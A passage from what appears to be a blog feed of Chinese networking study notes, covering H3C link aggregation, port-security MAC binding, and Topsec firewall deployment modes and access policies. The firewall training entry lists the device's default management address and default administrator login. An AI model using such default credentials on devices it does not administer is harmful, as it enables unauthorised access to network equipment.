class="line">--------------------------------------------------------------------------------</span><br><span class="line">  GE1/0/1             2       32768    1         0x8000, 1839-a4ca-0400 &#123;ACDEF&#125;</span><br><span class="line">  GE1/0/2             3       32768    1         0x8000, 1839-a4ca-0400 &#123;ACDEF&#125;</span><br><span class="line">  GE1/0/3             4       32768    1         0x8000, 1839-a4ca-0400 &#123;ACDEF&#125;</span><br></pre></td></tr></table></figure>

<p>即：聚合组1为负载分担类型的二层动态聚合组，包含有三个选中端口。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里需要注意几个点：</p>
<ol>
<li>两互连端口只有配置完全相同时，才能建立聚合关系（Status变成<strong>S</strong>）。</li>
<li>新加入端口的话，如果新端口配置与聚合组配置相同则可直接建立聚合关系，否则需要重新配置一遍聚合组的属性。</li>
<li>聚合组中删除物理端口后，在聚合组中配置的属性依然在物理端口上保留。</li>
</ol>
<h1 id="二层聚合边缘接口"><a href="#二层聚合边缘接口" class="headerlink" title="二层聚合边缘接口"></a>二层聚合边缘接口</h1><h2 id="组网需求-1"><a href="#组网需求-1" class="headerlink" title="组网需求"></a>组网需求</h2><ul>
<li><p>服务器Server与客户端Device通过端口GigabitEthernet1&#x2F;0&#x2F;1~GigabitEthernet1&#x2F;0&#x2F;3相互连接。</p>
</li>
<li><p>在Device上配置一个二层动态链路聚合组。</p>
</li>
<li><p>在Device上配置二层聚合接口为聚合边缘接口，以便当服务器Server上未配置动态聚合组时，Device上聚合组成员端口都能做为普通端口正常转发报文。</p>
</li>
</ul>
<h2 id="组网图-1"><a href="#组网图-1" class="headerlink" title="组网图"></a>组网图</h2><p>同上一实验：</p>
<p><img src="/1038/2.PNG"></p>
<h2 id="配置步骤-1"><a href="#配置步骤-1" class="headerlink" title="配置步骤"></a>配置步骤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建二层聚合接口1，配置该接口为动态聚合模式。</span><br><span class="line">&lt;Device&gt; system-view</span><br><span class="line">[Device] interface bridge-aggregation 1</span><br><span class="line">[Device-Bridge-Aggregation1] link-aggregation mode dynamic</span><br><span class="line"></span><br><span class="line"># 配置二层聚合接口1为聚合边缘接口。</span><br><span class="line">[Device-Bridge-Aggregation1] lacp edge-port</span><br><span class="line">[Device-Bridge-Aggregation1] quit</span><br><span class="line"></span><br><span class="line"># 分别将端口GigabitEthernet1/0/1~GigabitEthernet1/0/2加入到聚合组1中。</span><br><span class="line">[Device] interface gigabitethernet 1/0/1</span><br><span class="line">[Device-GigabitEthernet1/0/1] port link-aggregation group 1</span><br><span class="line">[Device-GigabitEthernet1/0/1] quit</span><br><span class="line">[Device] interface gigabitethernet 1/0/2</span><br><span class="line">[Device-GigabitEthernet1/0/2] port link-aggregation group 1</span><br><span class="line">[Device-GigabitEthernet1/0/2] quit</span><br><span class="line">[Device] interface gigabitethernet 1/0/3</span><br><span class="line">[Device-GigabitEthernet1/0/3] port link-aggregation group 1</span><br><span class="line">[Device-GigabitEthernet1/0/3] quit</span><br></pre></td></tr></table></figure>

<h2 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Device] display link-aggregation verbose</span><br><span class="line">Loadsharing Type: Shar -- Loadsharing, NonS -- Non-Loadsharing</span><br><span class="line">Port: A -- Auto</span><br><span class="line">Port Status: S -- Selected, U -- Unselected, I -- Individual</span><br><span class="line">Flags:  A -- LACP_Activity, B -- LACP_Timeout, C -- Aggregation,</span><br><span class="line">        D -- Synchronization, E -- Collecting, F -- Distributing,</span><br><span class="line">        G -- Defaulted, H -- Expired</span><br><span class="line"></span><br><span class="line">Aggregate Interface: Bridge-Aggregation1</span><br><span class="line">Aggregation Mode: Dynamic</span><br><span class="line">Loadsharing Type: Shar</span><br><span class="line">System ID: 0x8000, 1839-a4ca-0400</span><br><span class="line">Local:</span><br><span class="line">  Port                Status  Priority Oper-Key  Flag</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">  GE1/0/1             I       32768    1         &#123;AG&#125;</span><br><span class="line">  GE1/0/2             I       32768    1         &#123;AG&#125;</span><br><span class="line">  GE1/0/3             I       32768    1         &#123;AG&#125;</span><br><span class="line">Remote:</span><br><span class="line">  Actor               Partner Priority Oper-Key  SystemID               Flag</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">  GE1/0/1             0       32768    0         0x8000, 0000-0000-0000 &#123;DEF&#125;</span><br><span class="line">  GE1/0/2             0       32768    0         0x8000, 0000-0000-0000 &#123;DEF&#125;</span><br><span class="line">  GE1/0/3             0       32768    0         0x8000, 0000-0000-0000 &#123;DEF&#125;</span><br></pre></td></tr></table></figure>

<p>即：当Device未收到Server的LACP报文时，Device的聚合成员端口都工作在Individual状态，该状态下所有聚合成员端口可以作为普通物理口转发报文，以保证此时Server与Device间的链路都可以正常转发报文，且相互形成备份。</p>
<h1 id="三层链路聚合"><a href="#三层链路聚合" class="headerlink" title="三层链路聚合"></a>三层链路聚合</h1><p>三层链路聚合也分为动态与静态两种方式。</p>
<p>配置命令与二层几乎一致。只有两个不同的地方：</p>
<ol>
<li>创建二层聚合组命令是<code>int Bridge-Aggregation 1</code>；三层则是<code>int Route-Aggregation 1</code>。</li>
<li>在三层聚合组中需配置聚合组ip地址。</li>
</ol>
<h1 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h1><p>我感觉动态聚合模式与静态聚合模式最主要的区别在于是否用到协议上。</p>
<p>静态聚合只需两端物理配置相同，配置好之后聚合状态是不会变化的；动态聚合则还会根据LACP报文来改变聚合状态。</p>
<p>另外在S7500的<a href="http://www.h3c.com/cn/d_201806/1087511_30005_0.htm">命令手册</a>中，有提到可以开启端口的半自动聚合功能，这样只需要配置一端，另一端自动聚合。不过模拟器型号是S5800，我这里实机只有S5130和S5500，并没有这条命令供我测试。</p>
<p><img src="/1038/3.PNG"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><p>H3C S5500V2-EI系列以太网交换机 配置指导-Release 1118-6W100 二层技术-以太网交换配置指导 以太网链路聚合配置-新华三集团-H3C(<a href="http://www.h3c.com/cn/d_201809/1108195_30005_0.htm">http://www.h3c.com/cn/d_201809/1108195_30005_0.htm</a>)</p>
</li>
<li><p>H3C S7500X-G系列以太网交换机 命令参考-Release 7724-6W100 二层技术-以太网交换命令参考 以太网链路聚合命令-新华三集团-H3C(<a href="http://www.h3c.com/cn/d_201806/1087511_30005_0.htm">http://www.h3c.com/cn/d_201806/1087511_30005_0.htm</a>)</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>链路聚合</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习9.9 天融信防火墙厂家培训】</title>
    <url>/1039/</url>
    <content><![CDATA[<p>天融信防火墙厂家培训</p>
<span id="more"></span>

<h1 id="通讯模式"><a href="#通讯模式" class="headerlink" title="通讯模式"></a>通讯模式</h1><ol>
<li>透明模式（提供桥接功能）：交换模式，并非全透明</li>
<li>路由模式（静态路由功能）</li>
<li>综合模式（透明+路由模式）<br><em>4. 虚拟线模式：全透明，A口进B口出</em></li>
</ol>
<h1 id="安装前需要搞清楚的几个问题"><a href="#安装前需要搞清楚的几个问题" class="headerlink" title="安装前需要搞清楚的几个问题"></a>安装前需要搞清楚的几个问题</h1><ol>
<li>路由走向</li>
<li>IP地址的分配</li>
<li>数据应用和数据流向</li>
<li>要达到的安全目的（访问控制）</li>
</ol>
<ul>
<li>规则顺序</li>
<li>第一匹配规则</li>
<li>规则的一致性和逻辑性</li>
</ul>
<h2 id="防火墙长连接和短连接的概念"><a href="#防火墙长连接和短连接的概念" class="headerlink" title="防火墙长连接和短连接的概念"></a>防火墙长连接和短连接的概念</h2><ol>
<li>长连接的概念</li>
</ol>
<p>长连接功能用于设置特定数据流的超长保持时间，让数据流的会话连接保持时间不受全局老化时间限制。其实这项特殊业务与目前业界的状态防火墙的实现机制是存在矛盾的。</p>
<p>为保证内部网络的安全，防火墙上的各会话缺省保持时间都相对较短，例如：缺省情况下，TCP的保持时间为1200s，UDP的保持时间为120s。</p>
<p>正常情况下，当一个TCP会话的两个连续报文到达防火墙的时间间隔大于该会话的保持时间时，为保证网络的安全性，防火墙将从会话表中删除相应会话信息。后续报文到达防火墙后，防火墙根据自身的转发机制，丢弃该报文，导致连接中断。在实际应用中，用户需要查询服务器上的数据，这些查询时间间隔远大于TCP&#x2F;UDP默认的会话保持时间。此时需要在防火墙上保持TCP连接一段相对较长的时间。当某会话的报文长时间没有到达防火墙后再次到达时，仍然能够通过防火墙。这种技术就是长连接。</p>
<ol start="2">
<li>短连接的概念</li>
</ol>
<p>某些应用频繁发起连接，如果不缩短其会话保持时间，则会使防火墙的会话数爆涨，进而拖垮防火墙。保持太多的会话对防火墙没有必要，相反，当系统资源过多地用在会话保持的话，会相应损害每秒生成会话的能力，这是一个同样重要的性能指标。设定过高的会话数量，却降低了每秒生成会话的能力，其结果，只能是保留一些永远用不到的会话虚数而已。</p>
<p>因此，我们可以根据网络应用环境的实际需求，缩短某些会话的保持时间，从而减少防火墙的工作负荷，提高网络性能。</p>
<p><strong>长连接的配置在访问控制中。</strong></p>
<h1 id="管理方式"><a href="#管理方式" class="headerlink" title="管理方式"></a>管理方式</h1><ul>
<li>console</li>
<li>telent</li>
<li>ssh</li>
<li>webui</li>
</ul>
<p>管理地址<strong>192.168.1.254</strong><br>缺省用户<strong>superman</strong>、缺省密码<strong>talent</strong></p>
<h1 id="配置案例1"><a href="#配置案例1" class="headerlink" title="配置案例1"></a>配置案例1</h1><p><img src="/1039/1.PNG"></p>
<p>步骤：</p>
<ol>
<li>配置物理接口IP</li>
<li>配置区域对象权限</li>
<li>设置防火墙缺省网关</li>
<li>定义对象 - 定义主机对象 （WEB服务器内外网地址）</li>
<li>定义对象 - 定义子网对象（内网子网）</li>
<li>制定访问规则（1.内网可以访问互联网；2.外网只能访问WEB服务器80端口）</li>
<li>定义地址转换（1.内网easy IP；2.WEB服务器目的转换）</li>
<li>保存</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>防火墙</tag>
        <tag>天融信</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习9.9 天融信防火墙路由部署模式】</title>
    <url>/1040/</url>
    <content><![CDATA[<h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><p><img src="/1040/1.PNG"></p>
<span id="more"></span>

<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p><img src="/1040/2.PNG"></p>
<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="交换机配置"><a href="#交换机配置" class="headerlink" title="交换机配置"></a>交换机配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface Vlan-interface100</span><br><span class="line"> ip address 192.168.2.2 255.255.255.0</span><br><span class="line"></span><br><span class="line">interface Vlan-interface200</span><br><span class="line"> ip address 192.168.1.1 255.255.255.0</span><br><span class="line"></span><br><span class="line"> interface GigabitEthernet1/0/1</span><br><span class="line"> port link-type access</span><br><span class="line"> port access vlan 100</span><br><span class="line"></span><br><span class="line">interface GigabitEthernet1/0/2</span><br><span class="line"> port link-type access</span><br><span class="line"> port access vlan 200</span><br></pre></td></tr></table></figure>

<h2 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h2><h3 id="配置接口"><a href="#配置接口" class="headerlink" title="配置接口"></a>配置接口</h3><p>配置防火墙为路由模式，接口改为路由口：</p>
<p><img src="/1040/3.PNG"></p>
<h3 id="配置路由"><a href="#配置路由" class="headerlink" title="配置路由"></a>配置路由</h3><p>配置路由指向网关地址，使得我们可以远程管理防火墙：</p>
<p><img src="/1040/4.PNG"></p>
<h3 id="配置资源"><a href="#配置资源" class="headerlink" title="配置资源"></a>配置资源</h3><p>配置对应的主机、范围、子网、地址组等IP资源，方便后续再访问控制中使用，如有自定义服务，这里也一并定义：</p>
<ul>
<li>地址</li>
</ul>
<p><img src="/1040/5.PNG"></p>
<p><img src="/1040/6.PNG"></p>
<ul>
<li>区域</li>
</ul>
<p><img src="/1040/7.PNG"></p>
<ul>
<li>服务</li>
</ul>
<p><img src="/1040/8.PNG"></p>
<h3 id="配置地址转换"><a href="#配置地址转换" class="headerlink" title="配置地址转换"></a>配置地址转换</h3><p><img src="/1040/9.PNG"></p>
<h3 id="配置访问控制"><a href="#配置访问控制" class="headerlink" title="配置访问控制"></a>配置访问控制</h3><p>针对业务需求来做访问控制，（这里由于访问控制是按顺序进行匹配，所以明细策略需要放到最上边，大段的策略应该在明细策略下，最后加一条any—&gt;any的全禁止策略）：</p>
<p><img src="/1040/10.PNG"></p>
<h3 id="配置远程管理"><a href="#配置远程管理" class="headerlink" title="配置远程管理"></a>配置远程管理</h3><p>最后根据我们远程管理防火墙的方式来开启对应的服务。（开放服务是根据区域来开放的，后边的控制地址这里不建议配置为any，考虑到安全，专人专管或者部门专管，这里的控制地址建议配置成一个主机IP或者一段IP，指的就是哪些IP可以进行管理防火墙）：</p>
<p><img src="/1040/11.PNG"></p>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>防火墙</tag>
        <tag>天融信</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习9.10 天融信防火墙透明部署模式（access模式）】</title>
    <url>/1041/</url>
    <content><![CDATA[<h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><p><img src="/1041/1.PNG"></p>
<span id="more"></span>

<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><ol>
<li><p>防火墙配置透明access模式，连接保护，同步配置，查看配置是否可以同步</p>
</li>
<li><p>内网不允许访问外部的445端口并开启日志记录，允许访问web和ftp业务(80、21)</p>
</li>
<li><p>内网可以远程管理防火墙</p>
</li>
<li><p>策略做到精细化，保证通信安全</p>
</li>
</ol>
<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="交换机配置"><a href="#交换机配置" class="headerlink" title="交换机配置"></a>交换机配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vlan 100</span><br><span class="line">#</span><br><span class="line">vlan 200</span><br><span class="line">#</span><br><span class="line"> stp global enable</span><br><span class="line">#</span><br><span class="line">interface NULL0</span><br><span class="line">#</span><br><span class="line">interface Vlan-interface100</span><br><span class="line"> ip address 10.1.1.2 255.255.255.0</span><br><span class="line">#</span><br><span class="line">interface Vlan-interface200</span><br><span class="line"> ip address 192.168.1.1 255.255.255.0</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/1</span><br><span class="line"> port link-mode bridge</span><br><span class="line"> description INTO_FW</span><br><span class="line"> port access vlan 100</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/2</span><br><span class="line"> port link-mode bridge</span><br><span class="line"> description INTO_PC</span><br><span class="line"> port access vlan 200</span><br><span class="line"></span><br><span class="line">  ip route-static 0.0.0.0 0 10.1.1.1</span><br></pre></td></tr></table></figure>

<h2 id="路由器配置"><a href="#路由器配置" class="headerlink" title="路由器配置"></a>路由器配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface GigabitEthernet2/0/0</span><br><span class="line"> port link-mode route</span><br><span class="line"> combo enable copper</span><br><span class="line"> ip address 10.1.1.1 255.255.255.0</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet2/0/1</span><br><span class="line"> port link-mode route</span><br><span class="line"> combo enable copper</span><br><span class="line"> ip address 100.1.1.1 255.255.255.252</span><br><span class="line"> nat outbound 2000</span><br><span class="line"></span><br><span class="line"> ip route-static 0.0.0.0 0 10.1.1.2</span><br><span class="line">#</span><br><span class="line">acl basic 2000</span><br><span class="line"> rule 0 permit source 192.168.1.0 0.0.0.255</span><br><span class="line">#</span><br></pre></td></tr></table></figure>

<h2 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h2><h3 id="配置接口"><a href="#配置接口" class="headerlink" title="配置接口"></a>配置接口</h3><p>配置防火墙为透明模式，将接口改为交换模式，划入对应VLAN，并且给vlan配置IP地址，并且配置HA口，这里的心跳口记得要勾选非同步地址(涉及配置接口IP的地方都要配置非同步地址)：</p>
<p><img src="/1041/2.PNG"></p>
<p>配置vlan地址：</p>
<p><img src="/1041/3.PNG"></p>
<h3 id="配置路由"><a href="#配置路由" class="headerlink" title="配置路由"></a>配置路由</h3><p>配置一条默认路由指向网关地址，使得我们可以远程管理防火墙。（这里建议指一条明细路由，指向网络的管理网段）：</p>
<p><img src="/1041/4.PNG"></p>
<h3 id="配置资源"><a href="#配置资源" class="headerlink" title="配置资源"></a>配置资源</h3><p>配置对应的主机、范围、子网、地址组等IP资源，方便后续再访问控制中使用，如有自定义服务，这里也一并定义：</p>
<ul>
<li>地址</li>
</ul>
<p><img src="/1041/5.PNG"></p>
<ul>
<li>区域</li>
</ul>
<p><img src="/1041/6.PNG"></p>
<h3 id="配置访问控制"><a href="#配置访问控制" class="headerlink" title="配置访问控制"></a>配置访问控制</h3><p>针对业务需求来做访问控制，（这里由于访问控制是按顺序进行匹配，所以明细策略需要放到最上边，大段的策略应该在明细策略下，最后加一条any—&gt;any的全禁止策略）：</p>
<p><img src="/1041/7.PNG"></p>
<h3 id="配置远程管理"><a href="#配置远程管理" class="headerlink" title="配置远程管理"></a>配置远程管理</h3><p>最后根据我们远程管理防火墙的方式来开启对应的服务。（开放服务是根据区域来开放的，后边的控制地址这里不建议配置为any，考虑到安全，专人专管或者部门专管，这里的控制地址建议配置成一个主机IP或者一段IP，指的就是哪些IP可以进行管理防火墙）：</p>
<p><img src="/1041/13.PNG"></p>
<h3 id="配置连接保护"><a href="#配置连接保护" class="headerlink" title="配置连接保护"></a>配置连接保护</h3><ol>
<li>首先开启接口联动组，配置接口上下行接口划入接口联动组，并启用：</li>
</ol>
<p><img src="/1041/8.PNG"></p>
<ol start="2">
<li>然后在高可用性里配置HA模式为连接保护（双机热备、连接保护、负载均衡），配置心跳地址，并启用：</li>
</ol>
<p><img src="/1041/14.PNG"></p>
<p>然后在另一台设备配置高可用性，HA模式配置为连接保护，配置心跳地址，并启用。</p>
<ol start="3">
<li>然后我们可以在高可用性的同步操作里可以进行配置同步，可以将本机的配置同步到对端机，也可以将对端机的配置同步到本机：</li>
</ol>
<p><img src="/1041/9.PNG"></p>
<ol start="4">
<li>我们这里选择本机同步到对端机,在框里提示以下信息则为配置同步成功：</li>
</ol>
<p><img src="/1041/10.PNG"></p>
<h3 id="配置日志"><a href="#配置日志" class="headerlink" title="配置日志"></a>配置日志</h3><p>日志设置里可以指定日志服务器、选择级别及记录的内容：</p>
<p><img src="/1041/11.PNG"></p>
<p>日志查看处可以查找相关日志：</p>
<p><img src="/1041/12.PNG"></p>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>防火墙</tag>
        <tag>天融信</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day7 H3C设备配置端口绑定】</title>
    <url>/1021/</url>
    <content><![CDATA[<p>思科设备上配置端口绑定，使用 sticky 粘性绑定（也有叫端口粘滞的）。它可以把第一次从该端口学习到的MAC记录下来并做绑定，当另一台电脑接到这个端口上时，将不被允许通过。</p>
<p>H3C设备也有类似功能，配置命令略有不同。</p>
<p>在H3C模拟器上进行端口绑定的配置，系统版本v7。</p>
<span id="more"></span>

<h1 id="思科设备配置"><a href="#思科设备配置" class="headerlink" title="思科设备配置"></a>思科设备配置</h1><p>思科设备上在端口中启用port-security功能后，配置三种违规类型：</p>
<ol>
<li>protect：当违规时，只丢弃违规的数据流量，不违规的正常转发，而且不会通知有流量违规，也就是不会发送SNMP trap ；</li>
<li>restrict：当违规时，只丢弃违规的流量，不违规的正常转发，但它会产生流量违规通知，发送SNMP trap，并且会记录日志；</li>
<li>shutdown（默认）：当违规时，将接口变成error-disabled并shut down，并且接口LED灯会关闭，也会发SNMP trap，并会记录syslog。</li>
</ol>
<p>之后开启sticky 粘性绑定，即可把第一次从该端口学习到的MAC记录下来并做绑定。</p>
<p>配置命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cicso (config-if)#switchport mode access</span><br><span class="line">Cicso (config-if)#switchport port-security</span><br><span class="line">Cicso (config-if)#switchport port-security mac-address violation restrict</span><br><span class="line">Cisco (config-if)#switchport port-security mac-address sticky</span><br></pre></td></tr></table></figure>

<h1 id="H3C设备配置"><a href="#H3C设备配置" class="headerlink" title="H3C设备配置"></a>H3C设备配置</h1><p>h3c设备也可做类似的自动端口绑定，配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C]port-security enable</span><br><span class="line">[H3C-GigabitEthernet1/0/1]port-security max-mac-count 1</span><br><span class="line">[H3C-GigabitEthernet1/0/1]port-security port-mode autolearn //自动学习模式，必须先设置端口允许接入的最大MAC数量</span><br><span class="line"></span><br><span class="line">[H3C-GigabitEthernet1/0/1]dis this</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/1</span><br><span class="line"> port link-mode bridge</span><br><span class="line"> combo enable fiber</span><br><span class="line"> port-security max-mac-count 1</span><br><span class="line"> port-security port-mode autolearn</span><br><span class="line">#</span><br><span class="line">return</span><br><span class="line"></span><br><span class="line">//ping一下，交换机学到了mac地址</span><br><span class="line"></span><br><span class="line">[H3C-GigabitEthernet1/0/1]dis this</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/1</span><br><span class="line"> port link-mode bridge</span><br><span class="line"> combo enable fiber</span><br><span class="line"> port-security max-mac-count 1</span><br><span class="line"> port-security port-mode autolearn</span><br><span class="line"> port-security mac-address security sticky b238-902a-0206 vlan 1</span><br><span class="line">#</span><br><span class="line">return</span><br></pre></td></tr></table></figure>

<p>如果明确知道所需绑定mac地址及vlan，也可直接配置，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C-GigabitEthernet1/0/1]port-security mac-address security b238-902a-0206 vlan 1</span><br></pre></td></tr></table></figure>

<p>解除绑定的命令如下（注意顺序）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C-GigabitEthernet1/0/1]undo port-security port-mode</span><br><span class="line">[H3C-GigabitEthernet1/0/1]undo port-security max-mac-count</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>谈谈 H3C 的端口 MAC 地址粘性（sticky）绑定.(<a href="https://www.hack520.com/583.html">https://www.hack520.com/583.html</a> )</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>端口绑定</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习9.10 天融信防火墙透明部署模式（trunk模式）】</title>
    <url>/1042/</url>
    <content><![CDATA[<h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><p><img src="/1042/1.PNG"></p>
<span id="more"></span>

<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><ol>
<li><p>防火墙配置透明trunk模式</p>
</li>
<li><p>禁止访问外部客户端远程桌面连接，可以访问80、21</p>
</li>
<li><p>内网只允许192.168.1.0段远程管理防火墙</p>
</li>
<li><p>策略精细化，保证通信安全，并开启日志记录</p>
</li>
</ol>
<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="交换机配置"><a href="#交换机配置" class="headerlink" title="交换机配置"></a>交换机配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vlan 2 to 10</span><br><span class="line">#</span><br><span class="line">interface Vlan-interface1</span><br><span class="line"> ip address 192.168.1.1 255.255.255.0</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/1</span><br><span class="line"> port link-mode route</span><br><span class="line"> ip address 192.168.2.2 255.255.255.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ip route-static 0.0.0.0 0 192.168.2.1</span><br></pre></td></tr></table></figure>

<h2 id="路由器配置"><a href="#路由器配置" class="headerlink" title="路由器配置"></a>路由器配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface GigabitEthernet2/0/0</span><br><span class="line"> port link-mode route</span><br><span class="line"> combo enable copper</span><br><span class="line"> ip address 192.168.2.1 255.255.255.0</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet2/0/1</span><br><span class="line"> port link-mode route</span><br><span class="line"> combo enable copper</span><br><span class="line"> ip address 222.74.14.12 255.255.255.0</span><br><span class="line"></span><br><span class="line">ip route-static 0.0.0.0 0 192.168.2.2</span><br></pre></td></tr></table></figure>

<h2 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h2><h3 id="配置接口"><a href="#配置接口" class="headerlink" title="配置接口"></a>配置接口</h3><p>配置防火墙为透明模式，将接口改为交换模式（trunk）：</p>
<p><img src="/1042/2.PNG"></p>
<p>配置vlan地址：</p>
<p><img src="/1042/3.PNG"></p>
<h3 id="配置路由"><a href="#配置路由" class="headerlink" title="配置路由"></a>配置路由</h3><p>配置一条默认路由指向网关地址，使得我们可以远程管理防火墙：</p>
<p><img src="/1042/4.PNG"></p>
<h3 id="配置资源"><a href="#配置资源" class="headerlink" title="配置资源"></a>配置资源</h3><p>配置对应的主机、范围、子网、地址组等IP资源，方便后续再访问控制中使用，如有自定义服务，这里也一并定义：</p>
<ul>
<li>地址</li>
</ul>
<p><img src="/1042/5.PNG"></p>
<p><img src="/1042/6.PNG"></p>
<ul>
<li>区域</li>
</ul>
<p><img src="/1042/7.PNG"></p>
<h3 id="配置访问控制"><a href="#配置访问控制" class="headerlink" title="配置访问控制"></a>配置访问控制</h3><p>针对业务需求来做访问控制，（这里由于访问控制是按顺序进行匹配，所以明细策略需要放到最上边，大段的策略应该在明细策略下，最后加一条any—&gt;any的全禁止策略）：</p>
<p><img src="/1042/8.PNG"></p>
<h3 id="配置远程管理"><a href="#配置远程管理" class="headerlink" title="配置远程管理"></a>配置远程管理</h3><p>最后根据我们远程管理防火墙的方式来开启对应的服务。（开放服务是根据区域来开放的，后边的控制地址这里不建议配置为any，考虑到安全，专人专管或者部门专管，这里的控制地址建议配置成一个主机IP或者一段IP，指的就是哪些IP可以进行管理防火墙）：</p>
<p><img src="/1042/9.PNG"></p>
<h3 id="日志查询"><a href="#日志查询" class="headerlink" title="日志查询"></a>日志查询</h3><p>最后根据业务需要我们查询下访问控制的日志：</p>
<p><img src="/1042/10.PNG"></p>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>防火墙</tag>
        <tag>天融信</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习9.11 天融信防火墙混合部署模式】</title>
    <url>/1043/</url>
    <content><![CDATA[<h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><p><img src="/1043/1.PNG"></p>
<span id="more"></span>

<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><ol>
<li><p>防火墙混合模式部署</p>
</li>
<li><p>192.168.2.2可以访问外网地址222.74.14.13(通过地址转换实现)</p>
</li>
<li><p>192.168.2.2可以访问192.168.3.2的FTP和HTTP服务</p>
</li>
<li><p>通过地址转换可以实现222.74.14.13访问192.168.3.2的80和21端口</p>
</li>
<li><p>只允许192.168.2.2来远程webui管理防火墙</p>
</li>
<li><p>只允许192.168.3.2来远程ssh管理防火墙</p>
</li>
<li><p>策略精细化保证通讯安全并开启日志记录</p>
</li>
<li><p>将防火墙的所有日志外发到192.168.2.2</p>
</li>
</ol>
<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="路由器配置"><a href="#路由器配置" class="headerlink" title="路由器配置"></a>路由器配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface GigabitEthernet2/0/0</span><br><span class="line"> port link-mode route</span><br><span class="line"> combo enable copper</span><br><span class="line"> ip address 222.74.14.13 255.255.255.0</span><br></pre></td></tr></table></figure>

<h2 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h2><h3 id="配置接口"><a href="#配置接口" class="headerlink" title="配置接口"></a>配置接口</h3><p>配置防火墙为混合模式，接口分别有路由和交换口：</p>
<p><img src="/1043/10.PNG"></p>
<p>配置vlan地址：</p>
<p><img src="/1043/2.PNG"></p>
<h3 id="配置资源"><a href="#配置资源" class="headerlink" title="配置资源"></a>配置资源</h3><p>配置对应的主机、范围、子网、地址组等IP资源，方便后续再访问控制中使用，如有自定义服务，这里也一并定义：</p>
<ul>
<li>地址</li>
</ul>
<p><img src="/1043/4.PNG"></p>
<ul>
<li>区域</li>
</ul>
<p><img src="/1043/5.PNG"></p>
<h3 id="配置地址转换"><a href="#配置地址转换" class="headerlink" title="配置地址转换"></a>配置地址转换</h3><p><img src="/1043/6.PNG"></p>
<h3 id="配置访问控制"><a href="#配置访问控制" class="headerlink" title="配置访问控制"></a>配置访问控制</h3><p>针对业务需求来做访问控制，（这里由于访问控制是按顺序进行匹配，所以明细策略需要放到最上边，大段的策略应该在明细策略下，最后加一条any—&gt;any的全禁止策略）：</p>
<p><img src="/1043/7.PNG"></p>
